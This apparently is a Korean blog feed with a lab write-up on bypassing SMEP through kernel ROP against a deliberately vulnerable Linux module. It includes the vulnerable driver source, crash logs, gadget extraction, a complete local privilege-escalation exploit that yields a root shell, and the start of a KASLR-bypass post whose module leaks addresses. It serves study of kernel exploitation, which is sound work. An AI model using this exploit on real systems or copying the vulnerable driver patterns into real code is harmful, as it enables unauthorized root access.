CR3: 000000001d972000 CR4: 00000000001006f0[    4.744946] Call Trace:[    4.746173]  ? test_write+0x32/0x50 [test][    4.747038]  ? vfs_write+0xc2/0x1f0[    4.747557]  ? ksys_write+0x5a/0xd0[    4.751948]  ? do_syscall_64+0x3e/0x70[    4.753504]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9[    4.754301] Modules linked in: test(O)[    4.755895] CR2: 0000000000400c54[    4.758935] ---[ end trace 5a1c612f112c704d ]---[    4.759909] RIP: 0010:0x400c54[    4.760269] Code: Bad RIP value.[    4.760478] RSP: 0018:ffffc9000019feb8 EFLAGS: 00000246[    4.760915] RAX: 0000000000400c54 RBX: 0000000000000008 RCX: 0000000000000000[    4.761419] RDX: 0000000000000000 RSI: 00007ffe415d0348 RDI: ffffc9000019fec8[    4.761869] RBP: ffff88801d91e900 R08: 0000000000400c54 R09: 0000000000000000[    4.762291] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000[    4.762884] R13: 0000000000000008 R14: ffffc9000019ff10 R15: 00007ffe415d0340[    4.763462] FS:  00000000018a3880(0000) GS:ffff88801f200000(0000) knlGS:0000000000000000[    4.763968] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    4.764323] CR2: 0000000000400c54 CR3: 000000001d972000 CR4: 00000000001006f0[    4.764956] Kernel panic - not syncing: Fatal exception[    4.766565] Kernel Offset: disabled[    4.767284] Rebooting in 1 seconds..qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x0000000081400220This usually means one of the following happened:(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end(3) Your guest kernel has a bug and crashed by jumping off into nowhereThis is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.Execution cannot continue; stopping here.</code></pre><p>다음과 같이 smep이 적용된 리눅스 환경에서 유저영역에서의 페이로드를 실행시킬 경우 다음과 같은 문제가 발생한다.</p></br><p><img src="/img/cr4.PNG"></p><p>SMEP은 CPU의 CR4 Register의 SMEP에 해당하는 부분의 비트를 키거나 끔으로 적용이 가능하다. 그렇다면 다음과 같은 생각을 할 수 있다. 세상이 그렇게 간단하진 않지만 공격자가 CR4 레지스터의 원하는 부분을 제어(control)할 수 있다면 SMEP을 우회할 수 있지 않을까라는 생각을 했었고 자료조사 결과 실제로 이러한 공격기법을 이용할 수 있다는 결론를 얻었다. 하지만 해당 포스트에서는 보다 범용적인 Kernel기반의 ROP를 이용해서 우회할 예정이다. </p><pre><code>백문이 불여일격, 실제 바이너리를 통해 해당 공격을 적용해보겠다.</code></pre><p></br></br></p><h2 id="환경분석"><a href="#환경분석" class="headerlink" title="환경분석"></a>환경분석</h2><h3 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h3><pre><code>qemu-system-x86_64 \-m 512M \-kernel ./bzImage \-initrd  ./rootfs.cpio \-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \-nographic  \-cpu qemu64,smep \</code></pre><p>부팅 스크립트의 경우 다음과 같은 형태로 작성되어 있다. 확인해야 하는 부분은 해당 포스트의 목적은 SMEP우회를 주목적으로 하기에 KASLR을 비활성화 해두었으며 CPU 옵션에는 SMEP이 적용되어 있는 것을 확인할 수 있다.</p><p></br></br></p><h2 id="바이너리-분석"><a href="#바이너리-분석" class="headerlink" title="바이너리 분석"></a>바이너리 분석</h2><h3 id="디바이스-드라이버-소스코드"><a href="#디바이스-드라이버-소스코드" class="headerlink" title="디바이스 드라이버 소스코드"></a>디바이스 드라이버 소스코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;linux/input.h&gt;<br>#include &lt;linux/module.h&gt;<br>#include &lt;linux/init.h&gt;<br>#include &lt;linux/kernel.h&gt;<br>#include &lt;linux/miscdevice.h&gt;<br>#include &lt;linux/device.h&gt;<br>#include &lt;linux/slab.h&gt;<br>#include &lt;linux/uaccess.h&gt;<br>#include &lt;linux/string.h&gt;<br><br>MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);<br>MODULE_AUTHOR(&quot;SAMPLE&quot;);<br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos);<br><br>struct file_operations test_fops = &#123;<br>    .write  = test_write,<br>&#125;;<br><br>static struct miscdevice test_driver = &#123;<br>    .minor = MISC_DYNAMIC_MINOR,<br>    .name = &quot;test&quot;,<br>    .fops = &amp;test_fops,<br>&#125;;<br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    char arr[8] = &#123; [0 ... 7] = 0 &#125;;<br>    char *ptr;<br><br>    ptr = (char *)kmalloc(count, GFP_KERNEL);<br><br>    copy_from_user(ptr, buf, count);<br>    memcpy(arr, ptr, count);<br>    <br>    printk(&quot;arr : %x&quot;, arr[count-1]);  // prevent undefined behavior<br><br>    return 0;<br>&#125;<br><br><br>static int test_init(void) &#123;<br>    int result;<br><br>    result = misc_register(&amp;test_driver);<br><br>    return 0;<br>&#125;<br><br>static void test_exit(void) &#123;<br>    misc_deregister(&amp;test_driver);<br>&#125;<br><br>module_init(test_init);<br>module_exit(test_exit);<br></code></pre></td></tr></table></figure><p>해당 소스코드의 경우 공격 벡터(attack vector)가 될 수 있는 디바이스 드라이버 파일의 소스코드이다. 소스코드를 확인해볼 경우 file_operations 구조체 내부에서 write 시스템 콜에 대응하는 동작들을 정의하고 있다.</p><p>디바이스 드라이버 파일을 토대로 write 시스템 콜을 호출하게 될 경우 test_write() 함수가 실행된다. 해당 함수가 실행될 경우 line30~line33에 의하여 커널에서 메모리를 동적할당한 후 유저영역에서의 메모리를 해당 데이터의 크기만큼 복사하는 것을 확인할 수 있다.</p><p>이를 고려해보면 사용자가 입력한 데이터(untrusted input)의 크기를 제한하지 않는 문제로 인해서 스택 버퍼기반의 오버플로우가 발생할 것으로 예상된다.</p><p></br></br></p><h2 id="취약점-분석"><a href="#취약점-분석" class="headerlink" title="취약점 분석"></a>취약점 분석</h2><p><b>바이너리 분석</b>에서 사용자의 입력으로 부터 실행흐름을 변조할 가능성이 있음을 확인하였다. 해당 디바이스 드라이버를 토대로 write 시스템 콜이 호출되게 될 경우 디바이스 드라이버의 경우 사용자의 입력(untrusted input)이 버퍼 오버플로우를 발생시키기 때문이다. 예상한 결과가 맞는가에 대해서 확인해볼 필요가 있다.</p></br><h3 id="공격-코드"><a href="#공격-코드" class="headerlink" title="공격 코드"></a>공격 코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">//gcc -masm=intel -static -o exp exp.c -no-pie<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br><br>int main() &#123;<br>    int fd;<br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br><br>    // STEP1. Generate Payload<br>    size_t payload[18] = &#123;0, &#125;;<br><br>    memset(payload, 0x41, 8);<br>    memset(payload+1, 0x42, 8);<br>    memset(payload+2, 0x43, 8);<br>    memset(payload+3, 0x44, 8);<br>    memset(payload+4, 0x45, 8);<br>    memset(payload+5, 0x46, 8);<br>    memset(payload+6, 0x47, 8);<br>    memset(payload+7, 0x48, 8);<br>    memset(payload+9, 0x49, 8);<br><br><br>    // STEP2. Exploit<br>    write(fd, payload, sizeof(payload));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>디바이스 드라이버를 제어하는 코드를 작성하였다. 버퍼에 데이터를 어느정도 작성해야 Return Address를 컨트롤 할 수 있는가를 파악하기 위해서 연속적인 형태의 입력인 “AAA…ABBB.B…”를 입력하였다. 만약 RIP가 해당 입력값 중 하나의 값으로 변조된다면 이는 사용자의 입력으로 실행흐름을 변조할 수 있는 취약점으로 볼 수 있다. 참고로 스택 카나리는 비활성화 상태이다.</p><h3 id="공격-결과"><a href="#공격-결과" class="headerlink" title="공격 결과"></a>공격 결과</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ ./exploit [    5.999472] arr : 0[    5.999788] general protection fault: 0000 [#1] SMP NOPTI[    6.001957] CPU: 0 PID: 70 Comm: exploit Tainted: G           O      5.8.5 #1[    6.006606] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014[    6.009067] RIP: 0010:0x4545454545454545[    6.010246] Code: Bad RIP value.[    6.010565] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246[    6.011006] RAX: 0000000000000000 RBX: 4242424242424242 RCX: 0000000020727261[    6.011471] RDX: 4141414141414141 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0[    6.011960] RBP: 4343434343434343 R08: 0000000030203a20 R09: 0000000000000007[    6.012544] R10: 0000000000000046 R11: ffffffff82b2bba7 R12: 4444444444444444[    6.013009] R13: 0000000000000090 R14: ffffc9000019ff10 R15: 00007fff970c7710[    6.013527] FS:  0000000000d43880(0000) GS:ffff88801ee00000(0000) knlGS:0000000000000000[    6.014132] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    6.014516] CR2: 000000000045a040 CR3: 000000001d10e000 CR4: 00000000001006f0[    6.015070] Call Trace:[    6.015986]  ? do_syscall_64+0x3e/0x70[    6.016964]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9[    6.017975] Modules linked in: test(O)[    6.019737] ---[ end trace 543408c634e8da58 ]---[    6.024399] RIP: 0010:0x4545454545454545[    6.024920] Code: Bad RIP value.[    6.026318] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246[    6.026874] RAX: 0000000000000000 RBX: 4242424242424242 RCX: 0000000020727261[    6.027339] RDX: 4141414141414141 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0[    6.028103] RBP: 4343434343434343 R08: 0000000030203a20 R09: 0000000000000007[    6.029610] R10: 0000000000000046 R11: ffffffff82b2bba7 R12: 4444444444444444[    6.030238] R13: 0000000000000090 R14: ffffc9000019ff10 R15: 00007fff970c7710[    6.030691] FS:  0000000000d43880(0000) GS:ffff88801ee00000(0000) knlGS:0000000000000000[    6.031616] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    6.032050] CR2: 000000000045a040 CR3: 000000001d10e000 CR4: 00000000001006f0[    6.032733] Kernel panic - not syncing: Fatal exception[    6.033544] Kernel Offset: disabled[    6.034313] Rebooting in 1 seconds..qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x0000000081400220This usually means one of the following happened:(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end(3) Your guest kernel has a bug and crashed by jumping off into nowhereThis is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.Execution cannot continue; stopping here.</code></pre><p>해당 결과를 통해 RIP가 0x4545454545454545로 변조되었음을 확인할 수 있었고 해당 값은 사용자가 입력할 버퍼의 32만큼의 입력한 뒤의 값이다. 그러므로 payload[4]에 값을 작성할 경우 해당 값으로 실행흐름을 변조할 수 있다.</p><p></br></br></p><h2 id="취약점-공격"><a href="#취약점-공격" class="headerlink" title="취약점 공격"></a>취약점 공격</h2><p>분석과정을 통해 사용자의 입력(untrusted input)을 통해 실행흐름을 변조할 수 있음을 확인하였다. 이러한 정보들을 토대로 공격자에게 유의미한 형태의 공격이 될 수 있도록 어떠한 형태로 공격을 진행할 것인가에 대해서 시나리오를 작성하겠다.</p><p>가장 파급력있고 공격자에게 자유도가 높은 방법은 리눅스(linux) 기반의 커널을 공격하는 것이기에 루트 권한의 쉘(shell)을 획득하는 것으로 볼 수 있다. 다음과 같은 공격이 이루어지기 위해서는 우선적으로 진행되어야 하는 것이 유저 권한을 루트 권한으로 상승(권한 상승)을 일으켜야 한다. </p><h3 id="공격-시나리오"><a href="#공격-시나리오" class="headerlink" title="공격 시나리오"></a>공격 시나리오</h3><pre><code>STEP1. commit_creds(prepare_kernel_cred(0))을 통한 권한 상승STEP2. 사용자 모드(user mode)로의 전환STEP3. shell 획득</code></pre><p>다음의 시나리오는 SMEP이 적용되어 있지 않은 일반적인 형태의 공격(exploit)과 유사하다. Memory Randomization이 적용되어 있지 않기 때문에 실행시키고자 하는 함수인 commit_creds(), prepare_kernel_cred()를 하드코딩하여 값을 작성해도 된다.</p><p>여기서 고려해야하는 사항은 슈퍼바이저 모드(ring0)에서 유저영역의 payload를 실행할 수 없기 때문에 권한 상승을 commit_creds(prepare_kernel_cred(0)) 일으킨 후 유저 모드로 전환하는 과정을 커널에서 진행해야 한다. 결과적으로 이러한 과정은 Kernel ROP를 통해 ROP Payload에서 수행할 수 있다.</p><h3 id="가젯-구성"><a href="#가젯-구성" class="headerlink" title="가젯 구성"></a>가젯 구성</h3><p><img src="/img/calling_convetion.PNG" alt="Linux 64bit - calling convention"></p><p>ROP Payload를 작성하기에 앞서 commit_creds()와 prepare_kernel_cred(NULL)을 수행해야 하기에 현재의 아키텍쳐(intel x86/64)에서 함수 호출규약을 확인해볼 필요가 있다. 함수를 호출할 인자가 RDI, RSI, RDX, RCX, R8, R9, stack을 기반으로 하여 전달되는 것을 확인할 수 있다. 그리고 상단의 그림에서는 언급되어 있지 않지만 prepare_kernel_cred() 함수의 반환값의 경우는 RAX에 담긴다. 이러한 과정을 통해서 가젯을 구성할 수 있다.</p></br><pre><code>prepare_kernel_cred() [RDI:0]mov rdi, raxcommit_creds() [RDI: 결과값]swapgsiretq</code></pre><p>대략적으로 다음과 같은 형태로 명령어가 수행되어야 한다. prepare_kernel_cred()를 호출할 경우 첫 번째 인자인 RDI의 경우 0(NULL)로 세팅되어 있어야 하며 해당 함수의 반환값이 commit_creds() 함수의 첫 번째인자로 구성되어야 한다. 이후 다시 유저모드의 전환이 일어나야 한다.</p><h3 id="가젯-추출"><a href="#가젯-추출" class="headerlink" title="가젯 추출"></a>가젯 추출</h3><pre><code>$ objdump -M intel -d vmlinux | grep -a1 &quot;pop    rdi&quot; | grep -a2 &quot;ret&quot;ffffffff813fb9bb:    5a                       pop    rdxffffffff813fb9bc:    5f                       pop    rdiffffffff813fb9bd:    c3                       ret     </code></pre></br><pre><code>$ ROPgadget --binary vmlinux | grep &quot;mov rdi, rax&quot;0xffffffff82a081f0 : mov rdi, rax ; rep movsd dword ptr [rdi], dword ptr [rsi] ; ret0xffffffff81132ad8 : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; jmp 0xffffffff811329700xffffffff81b2413b : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret</code></pre></br><pre><code>$ objdump -M intel -d vmlinux | grep -a1 &quot;pop    rcx&quot; | grep -a2 &quot;ret&quot;ffffffff81057091:    8b 44 24 04              mov    eax,DWORD PTR [rsp+0x4]ffffffff81057095:    59                       pop    rcxffffffff81057096:    c3                       ret    --ffffffff8105c7bb:    e8 20 fd ff ff           call   0xffffffff8105c4e0--ffffffff8119a9f1:    5a                       pop    rdxffffffff8119a9f2:    59                       pop    rcxffffffff8119a9f3:    c3                       ret    --ffffffff8119ab2b:    5a                       pop    rdx--ffffffff8119acd6:    5a                       pop    rdxffffffff8119acd7:    59                       pop    rcxffffffff8119acd8:    c3                       ret   </code></pre></br><pre><code>$ ROPgadget --binary vmlinux | grep &quot;swapgs&quot;0xffffffff81c00f57 : nop ; swapgs ; ret</code></pre></br><pre><code>$ objdump -M intel -d vmlinux | grep -a1 &quot;iretq&quot;ffffffff810252ad:    68 b4 52 02 81           push   0xffffffff810252b4ffffffff810252b2:    48 cf                    iretq  ffffffff810252b4:    c3                       ret </code></pre><p>다음과 같은 형태로 vmlinux에서 공격 페이로드를 구성할 가젯을 추출할 수 있었다. 중간에 언급하지 않았던 <b>pop rcx</b> 가젯을 추출하였는 데, 해당 이유는 <b>rep movsq qword ptr [rdi], qword ptr [rsi]</b> 다음의 명령어 때문이다. 해당 명령어는 rsi에 있는 데이터를 rdi에 복사하는 형태의 명령어이며 반복횟수는 rcx 명령어로 결정된다. 그러므로 해당 명령어를 유효하지 않게 하기 위해서는 rcx를 0으로 세팅할 필요가 있다.</p></br><h3 id="공격코드"><a href="#공격코드" class="headerlink" title="공격코드"></a>공격코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>struct register_val &#123;<br>    uint64_t user_rip;<br>    uint64_t user_cs;<br>    uint64_t user_rflags;<br>    uint64_t user_rsp;<br>    uint64_t user_ss;<br>&#125; __attribute__((packed));<br><br>struct register_val rv;<br><br>void backup_rv(void) &#123;<br>    asm(&quot;mov rv+8, cs;&quot;<br>        &quot;pushf; pop rv+16;&quot;<br>        &quot;mov rv+24, rsp;&quot;<br>        &quot;mov rv+32, ss;&quot;<br>       );<br>&#125;<br><br>void shell() &#123;<br>    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);<br>&#125;<br><br>int main() &#123;<br>    int fd;<br>    size_t rop[18] = &#123;0, &#125;;<br>    <br>    void *commit_creds = 0xffffffff8108e9f0;<br>    void *prepare_kernel_cred = 0xffffffff8108ec20;<br><br>    printf(&quot;[+] EXPLOIT!\n&quot;);<br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br>    printf(&quot;    open file /dev/test\n&quot;);<br><br>    backup_rv();<br><br>    memset(rop, 0x41, 40);<br>    rop[4] = 0xffffffff813fb9bc;    <br>    rop[5] = 0;<br>    rop[6] = prepare_kernel_cred;   // prepare_kernel_cred(0)<br>    rop[7] = 0xffffffff813f4ef2;    <br>    rop[8] = 0;<br>    rop[9] = 0xffffffff81b241f0;    <br>    rop[10] = commit_creds;         // commit_creds()  <br>    rop[11] = 0xffffffff81c00f58;   // swapgs; ret;<br>    rop[12] = 0xffffffff810252b2;   // iretq; ret;<br>    rop[13] = &amp;shell;<br>    rop[14] = rv.user_cs;<br>    rop[15] = rv.user_rflags;<br>    rop[16] = rv.user_rsp;<br>    rop[17] = rv.user_ss;<br><br>    printf(&quot;    write payload\n&quot;);<br><br>    printf(&quot;    attack device driver\n&quot;);<br>    write(fd, rop, sizeof(rop));<br>    <br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="공격결과"><a href="#공격결과" class="headerlink" title="공격결과"></a>공격결과</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ whoamiuser/ $ ./exploit [+] EXPLOIT!    open file /dev/test    write payload    attack device driver/ # whoamiroot</code></pre><p></br></br></p><h2 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h2><pre><code>b30w0lf님의 운영체제(Operating System)DREAMHACK - Linux Kernel ExploitINFLEARN - 리눅스 커널 해킹. A부터 Z까지https://www.lazenca.net/pages/viewpage.action?pageId=25624859https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame</code></pre><p></br></br></p><h2 id="한줄평"><a href="#한줄평" class="headerlink" title="한줄평"></a>한줄평</h2><p><img src="/img/rip.PNG"></p><pre><code>I&#39;ll tell you all about it when i see you again. Rest in peace.</code></pre>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>smep</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Exploit - Bypassing KASLR</title>
    <link href="/2021/09/28/linux-kernel-exploit-bypassing-kaslr/"/>
    <url>/2021/09/28/linux-kernel-exploit-bypassing-kaslr/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Exploit-Bypassing-KASLR"><a href="#Research-Linux-Kernel-Exploit-Bypassing-KASLR" class="headerlink" title="[Research] Linux Kernel Exploit - Bypassing KASLR"></a>[Research] Linux Kernel Exploit - Bypassing KASLR</h2><p><img src="/img/penguinshot.png"></p><h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>해당 포스트에서는 Linux Kernel Basic 시리즈의 정보를 기반으로 하여 리눅스 커널에 적용되어 있는 보호기법(mitigation)을 하나씩 우회하여 exploit하는 과정을 포스트하려고 한다. 해당 포스트에서는 KASLR을 기반으로 하여 Exploit하는 과정을 작성하려고 한다.</p></br></br><h2 id="환경분석"><a href="#환경분석" class="headerlink" title="환경분석"></a>환경분석</h2><h3 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h3><pre><code>qemu-system-x86_64 \-m 512M \-kernel ./bzImage \-initrd  ./rootfs.cpio \-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \-nographic  \</code></pre><p>qemu를 실행시키는 스크립트를 살펴보면 해당 시스템에는 kaslr이 적용되어 있으며 다른 mitigation은 적용되어 있지 않다.</p></br></br><h2 id="바이너리-분석"><a href="#바이너리-분석" class="headerlink" title="바이너리 분석"></a>바이너리 분석</h2><h3 id="디바이스-드라이버-소스코드"><a href="#디바이스-드라이버-소스코드" class="headerlink" title="디바이스 드라이버 소스코드"></a>디바이스 드라이버 소스코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;linux/input.h&gt;<br>#include &lt;linux/module.h&gt;<br>#include &lt;linux/init.h&gt;<br>#include &lt;linux/kernel.h&gt;<br>#include &lt;linux/miscdevice.h&gt;<br>#include &lt;linux/device.h&gt;<br>#include &lt;linux/slab.h&gt;<br>#include &lt;linux/uaccess.h&gt;<br><br>MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);<br>MODULE_AUTHOR(&quot;SAMPLE&quot;);<br><br>static ssize_t test_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos);<br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos);<br><br>struct file_operations test_fops = &#123;<br>    .read   = test_read,<br>    .write  = test_write,<br>&#125;;<br><br>static struct miscdevice test_driver = &#123;<br>    .minor = MISC_DYNAMIC_MINOR,<br>    .name = &quot;test&quot;,<br>    .fops = &amp;test_fops,<br>&#125;;<br><br>static ssize_t test_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    void *ptr = &amp;printk;<br><br>    copy_to_user(buf, &amp;ptr, sizeof(ptr));<br><br>    return 0;<br>&#125;<br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    int (*fp_exec)(void) = 0; <br><br>    copy_from_user(&amp;fp_exec, buf, sizeof(fp_exec));<br><br>    fp_exec();<br><br>    return 0;<br>&#125;<br><br><br>static int test_init(void) &#123;<br>    int result;<br><br>    result = misc_register(&amp;test_driver);<br><br>    return 0;<br>&#125;<br><br>static void test_exit(void) &#123;<br>    misc_deregister(&amp;test_driver);<br>&#125;<br><br>module_init(test_init);<br>module_exit(test_exit);<br><br></code></pre></td></tr></table></figure><p>해당 소스코드의 경우 공격 벡터(attack vector)가 될 수 있는 디바이스 드라이버 파일의 소스코드이다. 소스코드를 확인해볼 경우 file_operations 구조체 내부에서 read, write 시스템 콜에 대응하는 동작들을 정의하고 있다. </p><p>디바이스 드라이버 파일을 토대로 read 시스템 콜을 호출하게 될 경우 test_read() 함수가 실행된다. 해당 함수가 실행될 경우 printk() 함수의 주소가 유저공간에 복사된다. 이를 토대로 유저공간의 사용자는 printk() 함수의 주소를 알 수 있다.</p><p>디바이스 드라이버 파일을 토대로 write 시스템 콜을 호출하게 될 경우 test_write() 함수가 실행된다. 해당 함수가 실행될 경우 line38, line40에서 사용자로부터 